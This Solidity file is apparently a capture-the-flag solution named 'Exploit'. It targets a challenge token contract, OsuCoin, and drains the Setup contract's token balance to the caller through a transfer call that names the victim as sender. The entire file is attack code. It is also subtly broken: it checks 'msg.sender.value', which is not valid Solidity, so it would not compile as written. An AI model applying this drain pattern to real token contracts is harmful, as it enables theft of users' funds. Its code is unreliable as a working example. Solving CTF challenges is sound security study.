// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./OsuCoin.sol";
import "./Setup.sol";

contract Exploit {
    Setup setup;
    OsuCoin coin;

    event Log(string message, uint256 val);

    constructor (address _setup) {
        setup = Setup(_setup);
        coin = setup.coin();
    }

    function attack() public payable {
        require(msg.sender.value >= 100 wei, "requires 100 wei");
        emit Log("My balance", msg.sender.balance);
        emit Log("Setup balance", address(setup).balance);

        coin.deposit{value: msg.value}();
        
        uint128 balance = coin.balanceOf(address(setup));
        emit Log("Setup Coin balance", balance);

        coin.transfer(address(setup), msg.sender, balance);
        require(setup.isSolved(), "Setup not solved");
    }
}
